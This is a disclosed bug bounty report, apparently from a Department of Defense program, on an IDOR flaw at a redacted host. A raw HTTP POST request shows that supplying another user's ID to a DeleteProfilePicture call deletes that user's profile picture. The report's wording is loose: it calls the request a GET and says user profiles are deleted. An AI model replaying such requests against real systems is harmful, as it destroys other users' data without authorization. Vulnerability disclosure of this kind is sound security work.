# IDOR to delete profile images in https:███████

## Report Details
- **Report ID**: 2213900
- **URL**: https://hackerone.com/reports/2213900
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2023-10-18T04:23:02.142Z
- **Disclosed**: 2023-12-21T17:42:51.198Z

## Reporter
- **Username**: maskedpersian
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: deptofdefense

## Vulnerability Information
Hi Team!
When I was testing the  https:█████████/userprofile.aspx discovered that pictures added were being deleted with a get request like so:
```
POST /AJAXUtilities.aspx HTTP/1.1
Host: ████████
Content-Length: 73
Sec-Ch-Ua: "Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"
Accept: text/plain, */*; q=0.01
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36
Sec-Ch-Ua-Platform: "Windows"
Origin: https:█████████
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https:████/userprofile.aspx
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,fa;q=0.8
Connection: close

strCall=DeleteProfilePicture&strUserId=72827C83FCED4483B2B1077EA5B0C041

```
strUserId params seemed like a potential IDOR that lead to delete profile picture just with UserId
Poc video attached

## Impact

delete user profiles just using strUserId

## System Host(s)
████████

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
video attached

## Suggested Mitigation/Remediation Actions




## Attachments
No attachments
